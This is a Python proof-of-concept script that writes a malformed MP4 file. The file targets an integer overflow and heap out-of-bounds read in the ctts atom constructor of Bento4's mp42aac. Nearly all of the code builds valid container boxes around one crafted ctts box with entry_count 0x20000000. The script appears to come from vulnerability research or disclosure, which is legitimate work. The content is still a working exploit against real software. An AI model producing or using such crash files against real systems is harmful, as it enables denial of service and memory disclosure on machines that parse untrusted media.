#!/usr/bin/env python3
"""
PoC generator for VULN 002 — AP4_CttsAtom Missing Bounds Check + Integer Overflow
Bento4 mp42aac: AP4_CttsAtom::AP4_CttsAtom() in Ap4CttsAtom.cpp

When entry_count >= 0x20000000, entry_count*8 overflows (uint32_t) to 0,
allocating a zero-byte buffer. The subsequent loop reads out of bounds.
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_002.mp4")


def box(box_type, payload):
    """Build a box: 4-byte size (BE) + 4-byte type + payload."""
    assert len(box_type) == 4
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type.encode() + payload


def fullbox(box_type, version, flags, payload):
    """Build a FullBox: size + type + version(1) + flags(3) + payload."""
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(box_type, fb_payload)


# --- ftyp ---
def make_ftyp():
    payload = b"mp42"          # major brand
    payload += struct.pack(">I", 0)   # minor version
    payload += b"mp42" + b"isom"      # compatible brands
    return box("ftyp", payload)


# --- mvhd (version 0, size=108) ---
def make_mvhd():
    # version=0, flags=0
    # creation_time, modification_time, timescale, duration  (each 4B for v0)
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)   # rate = 1.0
    payload += struct.pack(">H", 0x0100)       # volume = 1.0
    payload += b"\x00" * 10                   # reserved (10 bytes)
    # identity matrix (9 × 4 bytes = 36 bytes)
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += matrix
    payload += b"\x00" * 24   # pre_defined
    payload += struct.pack(">I", 2)   # next_track_id
    return fullbox("mvhd", 0, 0, payload)


# --- tkhd (version 0, size=92) ---
def make_tkhd():
    # flags=0x0f (enabled | in movie | in preview | in poster)
    payload = struct.pack(">II", 0, 0)   # creation, modification
    payload += struct.pack(">I", 1)       # track_id
    payload += b"\x00" * 4               # reserved
    payload += struct.pack(">I", 0)       # duration
    payload += b"\x00" * 8               # reserved
    payload += struct.pack(">hh", 0, 0)  # layer, alternate_group
    payload += struct.pack(">H", 0x0100) # volume
    payload += b"\x00" * 2              # reserved
    # identity matrix
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += matrix
    payload += struct.pack(">II", 0, 0)  # width, height
    return fullbox("tkhd", 0, 0x0f, payload)


# --- mdhd (version 0, size=32) ---
def make_mdhd():
    payload = struct.pack(">IIII", 0, 0, 44100, 0)  # creation, mod, timescale, duration
    payload += struct.pack(">H", 0x15c7)  # language
    payload += struct.pack(">H", 0)       # pre_defined
    return fullbox("mdhd", 0, 0, payload)


# --- hdlr ---
def make_hdlr():
    payload = struct.pack(">I", 0)        # pre_defined
    payload += b"soun"                    # handler_type
    payload += b"\x00" * 12              # reserved
    payload += b"\x00"                   # name (empty null-terminated)
    return fullbox("hdlr", 0, 0, payload)


# --- smhd ---
def make_smhd():
    payload = struct.pack(">HH", 0, 0)   # balance, reserved
    return fullbox("smhd", 0, 0, payload)


# --- dinf / dref ---
def make_dinf():
    # url entry with self-contained flag
    url_payload = b""  # no URL (self-contained)
    url_entry = fullbox("url ", 0, 1, url_payload)

    dref_payload = struct.pack(">I", 1) + url_entry  # entry_count=1
    dref = fullbox("dref", 0, 0, dref_payload)
    return box("dinf", dref)


# --- stsd (empty) ---
def make_stsd():
    payload = struct.pack(">I", 0)  # entry_count=0
    return fullbox("stsd", 0, 0, payload)


# --- stts (empty) ---
def make_stts():
    payload = struct.pack(">I", 0)  # entry_count=0
    return fullbox("stts", 0, 0, payload)


# --- ctts with entry_count=0x20000000 (NO actual entries) ---
def make_ctts_malicious():
    ENTRY_COUNT = 0x20000000  # triggers overflow: 0x20000000 * 8 = 0 (uint32)
    payload = struct.pack(">I", ENTRY_COUNT)
    # No actual entry data — the bug causes allocation of 0 bytes,
    # then the loop reads out of bounds
    return fullbox("ctts", 0, 0, payload)


# --- stsc (empty) ---
def make_stsc():
    payload = struct.pack(">I", 0)
    return fullbox("stsc", 0, 0, payload)


# --- stsz ---
def make_stsz():
    payload = struct.pack(">II", 0, 0)  # sample_size=0, sample_count=0
    return fullbox("stsz", 0, 0, payload)


# --- stco (empty) ---
def make_stco():
    payload = struct.pack(">I", 0)
    return fullbox("stco", 0, 0, payload)


# --- stbl ---
def make_stbl():
    payload = (make_stsd() + make_stts() + make_ctts_malicious() +
               make_stsc() + make_stsz() + make_stco())
    return box("stbl", payload)


# --- minf ---
def make_minf():
    payload = make_smhd() + make_dinf() + make_stbl()
    return box("minf", payload)


# --- mdia ---
def make_mdia():
    payload = make_mdhd() + make_hdlr() + make_minf()
    return box("mdia", payload)


# --- trak ---
def make_trak():
    payload = make_tkhd() + make_mdia()
    return box("trak", payload)


# --- moov ---
def make_moov():
    payload = make_mvhd() + make_trak()
    return box("moov", payload)


def main():
    ftyp = make_ftyp()
    moov = make_moov()
    mp4 = ftyp + moov

    with open(OUT_FILE, "wb") as f:
        f.write(mp4)

    print(f"[+] Written {len(mp4)} bytes to {OUT_FILE}")
    print(f"[+] ctts entry_count = 0x20000000 -> entry_count*8 overflows to 0")
    print(f"[+] Expected: heap buffer over-read in AP4_CttsAtom constructor loop")


if __name__ == "__main__":
    main()
